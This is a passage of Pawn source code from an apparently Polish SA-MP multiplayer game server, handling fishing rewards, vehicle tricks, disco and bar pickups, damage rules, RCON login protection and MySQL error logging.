		if(!IsPlayerInFishingPos(playerid))return SendClientMessage(playerid,COLOR_ERROR,"Jesteœ zbyt daleko wody");
		if(pInfo[playerid][player_last_fishing] > gettime())
		{
			SendClientMessage(playerid, COLOR_ERROR, ""chat" Poczekaj jeszcze %d sekund...", pInfo[playerid][player_last_fishing] - gettime());
			return 1;
		}
		pInfo[playerid][player_last_fishing] = gettime() + 10;
		ApplyAnimation(playerid, "SWORD", "sword_block", 50.0, 0, 1, 0, 1, 1);
		//SetProgressBarValue(pInfo[playerid][bar_ryby], GetProgressBarValue(pInfo[playerid][bar_ryby])+0.5);
		//ShowProgressBarForPlayer(playerid, pInfo[playerid][bar_ryby]);

		if(random(8) != 4)
		{
			SendClientMessage(playerid, COLOR_GREEN, ""chat" Niestety nie uda³o Ci siê nic z³owiæ.");
			return 1;
		}	
		else
		{
			ApplyAnimation(playerid, "CARRY", "crry_prtial", 2.0, 0, 0, 0, 0, 0);
			TogglePlayerControllable(playerid, 1);
			
			new xx=0;
			while(xx!=MAX_PLAYER_ATTACHED_OBJECTS)
			{
				if(IsPlayerAttachedObjectSlotUsed(playerid, xx))
				{
					RemovePlayerAttachedObject(playerid, xx);
				}
				xx++;
			}
			achievement(playerid, 5);
			new losek = random(11);
			switch(losek)
			{
				case 0:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Szprotkê. {/b}Dostajesz 100$ oraz 2 punkty respektu!");
					GivePlayerMoney(playerid, 100);
					GivePlayerScore(playerid, 2);
				}
				case 1:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}P³otkê. {/b}Dostajesz 200$ oraz 3 punkty respektu!");
					GivePlayerMoney(playerid, 200);
					GivePlayerScore(playerid, 3);
				}
				case 2:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Niestety, tym razem zerwa³eœ {b}linkê. {/b}Tracisz 2 punkty respektu oraz 150$");
					GivePlayerMoney(playerid, -150);
					GivePlayerScore(playerid, -2);
				}
				case 3:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Dorsza. {/b}Dostajesz 300$ oraz 4 punkty respektu!");
					GivePlayerMoney(playerid, 300);
					GivePlayerScore(playerid, 4);
				}
				case 4:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Suma. {/b}Dostajesz 350$ oraz 5 punków respektu!");
					GivePlayerMoney(playerid, 350);
					GivePlayerScore(playerid, 5);
				}
				case 5:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Wêgorza. {/b}Dostajesz 450$ oraz 7 punktów respektu!");
					GivePlayerMoney(playerid, 450);
					GivePlayerScore(playerid, 7);
				}
				case 6:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}£osoœia. {/b}Dostajesz 500$ oraz 10 punktów respektu!");
					GivePlayerMoney(playerid, 500);
					GivePlayerScore(playerid, 10);
				}
				case 7:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Karpie. {/b}Dostajesz 1000$ oraz 17 punktów respektu!");
					GivePlayerMoney(playerid, 1000);
					GivePlayerScore(playerid, 17);
				}
				case 8:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Raka. {/b}Dostajesz 1500$ oraz 25 punkty respektu!");
					GivePlayerMoney(playerid, 1500);
					GivePlayerScore(playerid, 25);
				}
				case 9:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Belugana. {/b}Dostajesz 2000$ oraz 30 punktów respektu!");
					GivePlayerMoney(playerid, 2000);
					GivePlayerScore(playerid, 30);
				}
				case 10:
				{
					SendClientMessage(playerid, COLOR_GREEN, ""chat" Gratulacje! Z³owi³eœ {b}Z³ot¹ Rybkê. {/b}Dostajesz 7000$ oraz 75 punktów respektu!");
					GivePlayerMoney(playerid, 7000);
					GivePlayerScore(playerid, 75);
				}
			}
		}
	}
	if((newkeys & 2) && (pInfo[playerid][player_cheats] > 0 && pInfo[playerid][player_cheats] <= 6) && (!GetPlayerVehicleSeat(playerid))) 
	{
		switch(pInfo[playerid][player_cheats]) 
		{
			case 1: 
			{
				// podskakiwanie
				new Float:X[3];
				GetVehicleVelocity(pInfo[playerid][player_usevehicle], X[0],X[1],X[2]);
				SetVehicleVelocity(pInfo[playerid][player_usevehicle], X[0],X[1],X[2]+0.1);
			}
			case 2: 
			{
				// turbo
        		new Float:Y[3];
				GetVehicleVelocity(pInfo[playerid][player_usevehicle], Y[0], Y[1], Y[2]);
				SetVehicleVelocity(pInfo[playerid][player_usevehicle], Y[0]*1.3, Y[1]*1.3, Y[2]*1.3);
			}
			case 3: 
			{
				// stopniowe zwalnianie
        		new Float:Z[3];
				GetVehicleVelocity(pInfo[playerid][player_usevehicle], Z[0], Z[1], Z[2]);
				SetVehicleVelocity(pInfo[playerid][player_usevehicle], Z[0]/1.3, Z[1]/1.3, Z[2]/1.3);
			}
			case 4: 
			{
				// natychamiastowy stop
				SetVehicleVelocity(pInfo[playerid][player_usevehicle], 0.0,0.0,0.0);
			}
			case 5: 
			{
				// obrot o 180
				new Float:Pos;
				GetVehicleZAngle(pInfo[playerid][player_usevehicle],Pos);
				SetVehicleZAngle(pInfo[playerid][player_usevehicle],Pos+180.0);
				SetCameraBehindPlayer(playerid);
			}
			case 6: 
			{
				ChangeVehicleColor(pInfo[playerid][player_usevehicle],random(255),random(255));
			}
		}
	}

	#undef KEY_PRESSED
	return 1;
} 
stock IsCbugWeapon(playerid)
{
	switch(GetPlayerWeapon(playerid))
	{
		case 22,24,25,27: return 1;
	}
	return 0;
}
public OnPlayerPickUpDynamicPickup(playerid, pickupid)
{
	if(pickupid == PickupDyskoteka[0])
	{
	    SetPlayerPos(playerid, 1673.8827,-1343.5024,801.3544);
	    SetPlayerFacingAngle(playerid, 182.0180);
	    SetPlayerInterior(playerid, 0);

		FreezePlayerTime(playerid, 2);
		SetPVarInt(playerid, "Dyskoteka", 1);
		PlayAudioStreamForPlayer(playerid,StacjeRadiowe[MuzaNaDysce][URL]);
		
		return 1;
	}
    else if(pickupid == PickupDyskoteka[1])
    {
        SetPlayerPos(playerid, 1834.8691,-1684.7156,13.4135);
        SetPlayerFacingAngle(playerid, 91.6853);
        SetPlayerVirtualWorld(playerid, 0);
        SetPlayerInterior(playerid, 0);
        DeletePVar(playerid, "Dyskoteka");

        StopAudioStreamForPlayer(playerid);
        return 1;
    }
    else if(pickupid == PickupDyskoteka[2])
    {
		string2[0] = EOS;
		for(new i = 0;i<sizeof(StacjeRadiowe);i++)
		{
			format(string2,sizeof(string2),"%s%s\n",string2, StacjeRadiowe[i][Nazwa]);
		}
		Dialog_Show(playerid, DIALOG_STACJE_DYSKA, DIALOG_STYLE_LIST, "{01FECF}DYSKOTEKA - {FD6631}MUZYKA", string2, "W³¹cz", "Anuluj");

		return 1;
    }
    else if(pickupid == PickupDyskoteka[3])
    {
        if(GetPVarInt(playerid, "SklepikBlokuj") == 1) return 0;

        SetPVarInt(playerid, "SklepikBlokuj", 1);
		GameTextForPlayer(playerid, "~p~~h~Bar p4s", 5000, 3);

		new lubiewdupe[600];
		strcat(lubiewdupe, "{FBFE65}[ PUSZKI ]\n{94C801}Tyskie {FF9C65}[Zimny]\n");
		strcat(lubiewdupe, "{94C801}Bosman {FF9C65}[Zimny]\n{94C801}Lech {FF9C65}[Zimny]\n");
		strcat(lubiewdupe, "{94C801}Warka {FF9C65}[Zimny]\n");
		strcat(lubiewdupe, "{FBFE65}[ BUTELKI ]\n{94C801}Tyskie {FF9C65}[Zimny]\n{94C801}Bosman {FF9C65}[Zimny]\n");
		strcat(lubiewdupe, "{94C801}Lech {FF9C65}[Zwyk³e]\n{94C801}Warka {FF9C65}[Zwyk³e]\n");
		strcat(lubiewdupe, "{FBFE65}[ SZLUGI ]\n{00C9CB}LM {3BFF19}< +18\n{00C9CB}Nevady {3BFF19}< +18\n{00C9CB}Malboro {3BFF19}< +18");
		strcat(lubiewdupe, "{00C9CB}Viceroye {3BFF19}< +18\n{00C9CB}Camele {3BFF19}< +18{00C9CB}Cygaro (PAMIÊTAJ ¯E PALENIE SZKODZI ZDROWIU) {3BFF19}< +18");
		
		Dialog_Show(playerid, BarDyskoteka, DIALOG_STYLE_LIST, "{00CC35}Bar P4S - Dyskoteka {FF00FC}PROSIMY SIÊ NIE NAJEBAÆ", lubiewdupe, "Wybierz", "Zamknij");
        return 1;
	}
    else if(pickupid == PickupDyskoteka[4])
    {
 		SetPlayerPos(playerid, 1688.0822,-1344.0292,804.6904);
		SetPlayerFacingAngle(playerid, 22.4082);
      	return 1;
	}
	else if(pickupid == PickupDyskoteka[5])
	{
 		SetPlayerPos(playerid, 1688.7161,-1349.9897,802.2396);
	 	SetPlayerFacingAngle(playerid, 180.4747);
	}
	

	if(pInfo[playerid][player_admin] == 0 && pickupid > 0)
	{
		if(pickupid == prezent_pickup)
		{
			DestroyDynamicPickup(prezent_pickup);
			prezent_pickup = -1;
			new win[2];
			win[0] = (random(500)+100);
			GivePlayerMoney(playerid, 5000);
			GivePlayerScore(playerid, win[0]);
			SendClientMessageToAll(-1, "» {008ae6}%s (%d) {/b}znalaz³ swój {008ae6}%d prezent{/b} otrzymuje {008ae6}%d{/b} respektu", playerNick(playerid), playerid, addPointEvent(playerid, stats_prezenty), win[0]); //wygenerowany
			
			TextDrawSetString(__walizka[1], "_");
			TextDrawHideForAll(__walizka[1]);
	
			achievement(playerid, 19);
		}
		if(pickupid == walizka_pickup)
		{
			DestroyDynamicPickup(walizka_pickup);
			walizka_pickup = -1;
			new win[2];
			win[0] = (random(500)+100);
			win[1] = (random(5000)+5000);
			GivePlayerMoney(playerid, 5000);
			GivePlayerScore(playerid, win[0]);
			SendClientMessageToAll(-1, "» {008ae6}%s (%d){/b} znalaz³ swoj¹ {008ae6}%d walizkê{/b} otrzymuje {008ae6}%d{/b} respektu", playerNick(playerid), playerid, addPointEvent(playerid, stats_walizki), win[0]); //wygenerowany
			
			TextDrawSetString(__walizka[0], "_");
			TextDrawHideForAll(__walizka[0]);
	
			achievement(playerid, 19);
		}
		for(new i=0;i<MAX_Figure;i++)
		{
			if(pickupid == FigureInfo[i][Figureid]) 
			{
				achievement(playerid, 19);
				
				new score = random(325)+125;
				GivePlayerScore(playerid, score);
				
				SendClientMessage(playerid, COLOR_GREEN, ""chat" Znalaz³eœ {b}figurkê{/b}, otrzymujesz {b}%i{/b} Score!", score); 
				SendClientMessageToAll(-1, ""chat" {008ae6}%s{/b} po raz {008ae6}%d{/b} znalaz³ Figurkê i otrzymuje %i Score", playerNick(playerid), addPointEvent(playerid, stats_figurki), score);
				
				DestroyDynamicPickup(FigureInfo[i][Figureid]);
				DestroyDynamic3DTextLabel(FigureInfo[i][Figureid_label]);		
				
				m_query("delete from "prefix"_figure where id=%d", FigureInfo[i][Figureid_sql]);
				
				FigureInfo[i][Figureid] = -1;
				FigureInfo[i][Figureid_sql] = -1;
				FigureCount--;
				break;
			}
		}
		 
	}
	for(new i=0;i<telePickapow;i++)
	{
		if(TelePickups[i][tpData_pickupid] == pickupid) return OnPlayerEnterTelePickup(playerid, i);
	}
	hOnPlayerPickUpDynamicPickup(playerid, pickupid);
	b_OnPlayerDynamicPickup(playerid, pickupid);
	
	return 1;
}  
public OnPlayerWeaponShot(playerid, weaponid, hittype, hitid, Float:fX, Float:fY, Float:fZ)
{ 
	if(hittype != BULLET_HIT_TYPE_NONE)
	{
		if(!(-200.0 <= fX <= 200.0 ) || !(-200.0 <= fY <= 200.0) || !(-200.0 <= fZ <= 200.0))
		{
			systemprintf("bulletcrash", true, "bulletcrash (%s) %d, %d, %d, %.1f, %.1f, %.1f", playerNick(playerid), weaponid, hittype, hitid, fX, fY, fZ);
			Kick(playerid);
			return 0;
		}
	}
	
   
	return 1;
}
public OnPlayerEditAttachedObject(playerid, response, index, modelid, boneid, Float:fOffsetX, Float:fOffsetY, Float:fOffsetZ, Float:fRotX, Float:fRotY, Float:fRotZ, Float:fScaleX, Float:fScaleY, Float:fScaleZ)
{
	if(response)
	{
		SetPlayerAttachedObject(playerid, index, modelid, boneid, fOffsetX, fOffsetY, fOffsetZ, fRotX, fRotY, fRotZ, fScaleX, fScaleY, fScaleZ);
		SendClientMessage(playerid, COLOR_GREEN, ""chat" Pomyœlnie przeszed³eœ proces ustawiania pozycji dodatku!");
	}
	return 1;
}

/*public OnPlayerGiveDamage(playerid, damagedid, Float: amount, weaponid, bodypart)
{

	if(playerid != INVALID_PLAYER_ID) 
	{
		//PlaySoundForPlayer(playerid, 17802);
		pInfo[damagedid][player_last_damage] = gettime() + 6;

		
		if(player_gangInfo(playerid, gangWojnaTrwa) == true && pInfo[playerid][player_gang] != pInfo[damagedid][player_gang] && pInfo[playerid][player_sparmember] && pInfo[damagedid][player_sparmember])
		{
				
				pInfo[playerid][player_spardmg] += amount;
				
				if(pInfo[playerid][player_id] == 1) pInfo[playerid][player_spardmg] += amount;
				
				InfoTDBox(playerid, splitf("DMG + %.1f (Total: %.1f)", amount, pInfo[playerid][player_spardmg]));
		
		}
		//SendClientMessage(playerid, 0, "debug optd tw dmg: %.1f ammout %.1f",  pInfo[playerid][player_spardmg], amount);
		
		if(pInfo[damagedid][player_no_dm])
		{
			if(pInfo[playerid][player_nodm_shoottime] < gettime())
			{
				pInfo[playerid][player_nodm_shoottime] = gettime() + 3;
				
				if(pInfo[playerid][player_warn_no_dm] >= 3)
				{
					AddPlayerPenalty(playerid, P_JAIL, INVALID_PLAYER_ID, 90, "Strzelanie do graczy w strefie bez DM");
					pInfo[playerid][player_warn_no_dm]=0;
					return 1;
				}
				else if(pInfo[playerid][player_warn_no_dm] < 3)
				{
					pInfo[playerid][player_warn_no_dm]++;
					SendClientMessage(playerid, COLOR_ERROR, "* Strzelanie do graczy w strefie BEZ DM jest zabronione, Ostrze¿enia ({b}%i/3{/b})",pInfo[playerid][player_warn_no_dm]);
					InfoBox(playerid, "Otrzyma³eœ ostrze¿enie!\n\n----------------------------\nNie wolno strzelaæ do graczy w strefie bez DM!");
					return 1;
				}
			}
			//SetPlayerHealth(damagedid, 100.0);
			return 1;
        }
		if(pInfo[damagedid][player_arena] == stats_onede && pInfo[playerid][player_arena] == stats_onede && weaponid == 24)
			SetPlayerHealth(damagedid, 0.0);


		if((GetPlayerState(playerid) == PLAYER_STATE_PASSENGER || GetPlayerState(playerid) == PLAYER_STATE_DRIVER) && playerid != damagedid)
		{
			SendClientMessage(playerid, COLOR_ERROR, "* Na serwerze jest zakaz {b}Drive Thru{/b} Warn %d/4.", pInfo[damagedid][player_dbwarn]+1);
			
			if(pInfo[damagedid][player_dbwarn]++ > 3)
			{	
				new Float:pos[3];
				GetPlayerPos(playerid, pos[0], pos[1], pos[2]);
				SetPlayerPos(playerid, pos[0], pos[1], pos[2]+0.1);
				
				pInfo[damagedid][player_dbwarn] = 0;
			}
			
			return 1;
		}
		// anty dtbk
		
		
	}
    return 1;
}*/

forward resdmg(playerid);
public resdmg(playerid)
{
	pInfo[playerid][gavedmg] = false;
	return 1;
}

public OnPlayerTakeDamage(playerid, issuerid, Float: amount, weaponid, bodypart)
{
    if(issuerid != INVALID_PLAYER_ID) // If not self-inflicted
    {
        KillTimer(ResGdmg[issuerid]);
        pInfo[issuerid][gavedmg] = true;
        ResGdmg[playerid] = SetTimerEx("resdmg",5000,0,"d",playerid);
    	if(GetPlayerState(issuerid) == PLAYER_STATE_PASSENGER)
		{
			if(weaponid >= 22 && weaponid <= 38) {
	    		SendClientMessage(issuerid,COLOR_ERROR,"* Na serwerze jest zakaz DT *");
	    		new Float:pos0[3];
				GetPlayerPos(issuerid, pos0[0], pos0[1], pos0[2]);
				SetPlayerPos(issuerid, pos0[0] + 2, pos0[1] + 2, pos0[2] + 2);
	    		return 0;
	    	}
		}
		pInfo[playerid][player_last_damage] = gettime() + 6;
		if(player_gangInfo(issuerid, gangWojnaTrwa) == true && pInfo[issuerid][player_gang] != pInfo[playerid][player_gang] && pInfo[issuerid][player_sparmember] && pInfo[playerid][player_sparmember])
		{
			pInfo[issuerid][player_spardmg] += amount;

			if(pInfo[issuerid][player_id] == 1) pInfo[issuerid][player_spardmg] += amount;

			InfoTDBox(issuerid, splitf("DMG + %.1f (Total: %.1f)", amount, pInfo[issuerid][player_spardmg]));
		}
		if(pInfo[playerid][player_no_dm])
		{
			if(pInfo[issuerid][player_nodm_shoottime] < gettime())
			{
				pInfo[issuerid][player_nodm_shoottime] = gettime() + 3;

				if(pInfo[issuerid][player_warn_no_dm] >= 3)
				{
					AddPlayerPenalty(issuerid, P_JAIL, INVALID_PLAYER_ID, 90, "Strzelanie do graczy w strefie bez DM");
					pInfo[issuerid][player_warn_no_dm]=0;
					return 1;
				}
				else if(pInfo[issuerid][player_warn_no_dm] < 3)
				{
					pInfo[issuerid][player_warn_no_dm]++;
					SendClientMessage(issuerid, COLOR_ERROR, "* Strzelanie do graczy w strefie BEZ DM jest zabronione, Ostrze¿enia ({b}%i/3{/b})",pInfo[issuerid][player_warn_no_dm]);
					InfoBox(issuerid, "Otrzyma³eœ ostrze¿enie!\n\n----------------------------\nNie wolno strzelaæ do graczy w strefie bez DM!");
					return 1;
				}
			}
			//SetPlayerHealth(damagedid, 100.0);
			return 1;
        }
    }
    
    
    
    return 1;
    
}
stock VehicleHasDriver(vehicleid)
{
     for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
     {
           if(IsPlayerInAnyVehicle(i))
           {
                if(GetPlayerVehicleID(i)==vehicleid)
                {
                       if(GetPlayerState(i) == PLAYER_STATE_DRIVER)
                       {
                             return 1;
                        }
                 }
           }
     }
     return 0;
}

public OnVehicleInvalidMod(playerid, vehicleid)
{

	for(new i;i<14;i++)
		RemoveVehicleComponent(vehicleid, GetVehicleComponentInSlot(vehicleid, i));
	 
	return 1;
}
public OnVehicleMod(playerid, vehicleid, componentid)
{

	new k = IsValidTune(vehicleid, componentid);
	if(!k)
	{
		CallRemoteFunction("OnVehicleInvalidMod", "dd", playerid, vehicleid);
		return 0;
	}
	
	return 1;
}
public OnPlayerExitVehicle(playerid, vehicleid)
{	
	pInfo[playerid][player_driftcouter] = false;
	pInfo[playerid][player_usevehicle] = 0;
	return 1;
}
public OnPlayerEnterVehicle(playerid, vehicleid, ispassenger)
{
	pInfo[playerid][player_usevehicle] = vehicleid;
    return 1;
}
public OnPlayerEnterDynamicCP(playerid, checkpointid)
{
	for(new i; i < BankCount; i++)
	{
	    if(checkpointid == Bank[i][Bank_cp])
		{
			return Dialog_BankMenu(playerid);
		}
	}
	Skup_OnPlayerEnterDynamicCP(playerid, checkpointid);
	if(Tir_GetPlayerCheckPoint(playerid)) Tir_OnCheckpointEnterer(playerid, checkpointid);
	
	return 1;
}
public OnRconLoginAttempt(ip[], password[], success)
{
	new p = findPlayer(ip);
	
	Plugin_SaveIntData(MAP_VEHICLES, splitf("zew.rcon%s", ip), gettime()+10);
		
	if(!success && p == INVALID_PLAYER_ID && Plugin_GetIntData(MAP_VEHICLES, splitf("zew.rcon%s", ip)) > gettime())  
	{
		SendRconCommand("rcon 0");
	}
	
    if(!IsPlayerConnected(p)) return 0;
	if(success == 1 && p != INVALID_PLAYER_ID)
	{
		if(pInfo[p][player_admin_login]>=R_HEADADMIN)
		{
			pInfo[p][player_color] = 0xFF000040;
			pInfo[p][player_admin] = R_HEADADMIN;
			Iter_Add(Admins, p);
			UpdatePlayerNick(p);
			SendClientMessageToAll(COLOR_INFO2, ""chat" {b}%s (%d){/b} zalogowa³ siê jako administrator poziom {b}%d{/b} {ff0000}R{ffffff}*", pInfo[p][player_name], p, pInfo[p][player_admin]-1);
			return 1;
		}
		SendAdminsMessage(COLOR_RED,  "SERVER: %s (ID: %d, IP: %s) poda³ dobre has³o RCON! BEZ AUTORYZACJI.", playerNick(p), p, ip);
		Kick(p);
		return 0; 
	}
	if(!success && p != INVALID_PLAYER_ID)  
    {
		#if defined Plugin_4Fun
		
		Plugin_SaveIntData(MAP_VEHICLES, splitf("rconip_%s", ip), Plugin_GetIntData(MAP_VEHICLES, splitf("rconip_%s", ip))+1);
		
		
		if(Plugin_GetIntData(MAP_VEHICLES, splitf("rconip_%s", ip)) > 5)
		{
			SendClientMessage(p, 0xFFFFFFFF, "SERVER: RCON (In-Game): Player #%s (%d) failed login.", playerNick(p), p);
			SendClientMessageToAll(0xFFFFFFFF, "SERVER: RCON (In-Game): Player #%s (%d) failed login has banned.",playerNick(p), p);
			
			format(string2, sizeof(string2), "SERVER: Zbanowano %s (ID: %d, IP: %s) z powodu b³êdnego i nie autoryzowanego logowania na RCON!", playerNick(p), p, ip);
			SendAdminsMessage(COLOR_RED, string2);
			BanEx(p, "RCON Crasher");
			return 0;
		}
		
		format(string2, sizeof(string2), "SERVER: %s (ID: %d, IP: %s) próbuje zalogowaæ siê jako administator RCON!", playerNick(p), p, ip);
		SendAdminsMessage(COLOR_RED, string2);
		SendClientMessage(p, 0xFFFFFFFF, "SERVER: Bad admin password. Warn %d/4 will get you banned.", Plugin_GetIntData(MAP_VEHICLES, splitf("rconip_%s", ip)));
		return 0;
		#endif
	} 

    return 0;
}
 
stock return_escape(str[])
{
	static _ret_escape[512];
	_ret_escape[0] = EOS;
	mysql_real_escape_string(str, _ret_escape);
	return _ret_escape;
}
public OnPlayerPickUpPickup(playerid, pickupid)
{
    if(pickupid == script_DF[df_Pickup])
    {
		if(Iter_Contains(d_f_players, playerid) && script_DF[df_team][playerid] == df_atakujacy)
		{
			script_DF[winreed] = playerid;
		}
    }
    
    return 1;
}
public OnPlayerEnterCheckpoint(playerid)
{
	if(pInfo[playerid][player_inlabirynt])
	{
		for(new rand;rand<sizeof(LabyrinthFinish);rand++)
		{	
			if(IsPlayerInRangeOfPoint(playerid, 5.5, LabyrinthFinish[rand][0], LabyrinthFinish[rand][1], LabyrinthFinish[rand][2]))
			{
				new score = random(15)+10;
				
				GivePlayerMoney(playerid, 1000);
				GivePlayerScore(playerid, score);
				
				pInfo[playerid][player_inlabirynt] = false;
				OnPlayerSpawn(playerid);
				
				SendClientMessageToAll(COLOR_GOLD, ""chat" Gracz %s (%d) przeszed³(a) labirynt! otrzymuje %d respektu oraz 1000$", playerNick(playerid), playerid, score);
				achievement(playerid, 25);
				
				break;
			}
		}
	}
	if(IsPlayerInRangeOfPoint(playerid,5.0,1131.7675,-1320.0020,13.7164))
	{
			for(new i = 0, j = GetPlayerPoolSize(); i <= j; i++)
			{
			    if(pRob[playerid][playing])
			    {
					DisablePlayerCheckpoint(i);
			    }
			}
	}
	if(Rob[Hakowanie] == 2 && IsPlayerInRangeOfPoint(playerid,5.0,1112.0923,-307.3483,73.9922))
	{
	    new veg = GetPlayerVehicleID(playerid);
	    if(veg == Rob[MainCar] && GetPlayerVehicleSeat(playerid) == 0)
	    {
			GangRobEnd(2);
		}
	}
	
	return 1;
}
public OnPlayerEditDynamicObject(playerid, objectid, response, Float:x, Float:y, Float:z, Float:rx, Float:ry, Float:rz)
{
	if(house_OnPlayerEditDynamicObject(playerid, objectid, response, x, y, z, rx, ry, rz))
		return 1;
	
	for(new xc;xc<MAX_PLAYER_VEHICLE_OBJECT;xc++)
	{
		if(player_vehicle_object[playerid][xc] == objectid && player_vehicle_object[playerid][xc] > 0)
		{
			if(response == EDIT_RESPONSE_FINAL)
			{
				new Float:X, Float:Y, Float:Z, Float:rZ;
				new pojazd = pInfo[playerid][player_usevehicle];
				GetVehiclePos(pojazd, X, Y, Z);
				GetVehicleZAngle(pojazd, rZ);
				
				new Float:finalx = (x-X)*floatcos(rZ, degrees)+(y-Y)*floatsin(rZ, degrees);
				new Float:finaly = (x-X)*floatsin(rZ, degrees)+(y-Y)*floatcos(rZ, degrees);
				
				if(finalx > 1.0 || finalx < -1.0)
				{
					SendClientMessage(playerid, COLOR_ERROR, ""chat" Ustawi³eœ obiekt zbyt daleko;/ Musisz daæ go bli¿ej pojazdu.");
					EditDynamicObject(playerid, objectid);
					return 1;
				}
				if(finaly > 1.0 || finaly < -1.0)
				{
					SendClientMessage(playerid, COLOR_ERROR, ""chat" Ustawi³eœ obiekt zbyt daleko;/ Musisz daæ go bli¿ej pojazdu.");
					EditDynamicObject(playerid, objectid);
					return 1;
				}
				AttachDynamicObjectToVehicle(objectid, pojazd, finalx, finaly, z-Z, rx, ry, rz-rZ);				
				SendClientMessage(playerid, -1, "(Info) Zakoñczono edycjê obiektu.");
			}
			
			if(response == EDIT_RESPONSE_CANCEL)
			{
				if(objectid)
				{
					SendClientMessage(playerid, COLOR_ERROR, ""chat" Anulowa³eœ ustawianie obiektu zosta³ on usuniêty.");
				}
			}
			return 1;
		}
	}
	return 1;
}
 
public OnVehicleSpawn(vehicleid)
{
	WyjebDoczepianeObiekty(vehicleid);
	
	for(new x; x<WHighestID;x++)
	{
	    if(vehicleid == Wp[x][vehicle])
	    {
	        SetVehiclePos(Wp[x][vehicle], Wp[x][wpos][0], Wp[x][wpos][1], Wp[x][wpos][2]);
	        SetVehicleZAngle(Wp[x][vehicle], Wp[x][wpos][3]);
	        
	    }
	}
	
/*
	foreach(new playerid : Player)
	{
		if(pInfo[playerid][player_vehicle] == vehicleid)
		{
			if(IsPlayerInVehicle(playerid, pInfo[playerid][player_vehicle]))
			{
				//SendClientMessage(playerid, COLOR_ERROR, "[DEBUG][BUMM] Je¿eli znik³ Ci pojazd"
				systemprintf("debugvehicle",true, "spawnuje sie pojazd id %d  nalezacy do %s wtf? ", vehicleid, playerNick(playerid));
				return 0;
			}
		}
	}*/
	return 1;
}

public OnMysqlError(error[], errorid, MySQL:handle)
{
	
	static lol10[512];
	lol10[0] = EOS;
	strcat(lol10, lastQuery);
	systemprintf_nt("debug_mysql", "--------------------- [MySQL ERROR] %s {%d}! -------------------", error, errorid);
	systemprintf_nt("debug_mysql", "  Executed last query: %s",lol10);


	
	return 1;
}

// TYMCZASOWO ŒWIÊTA
 
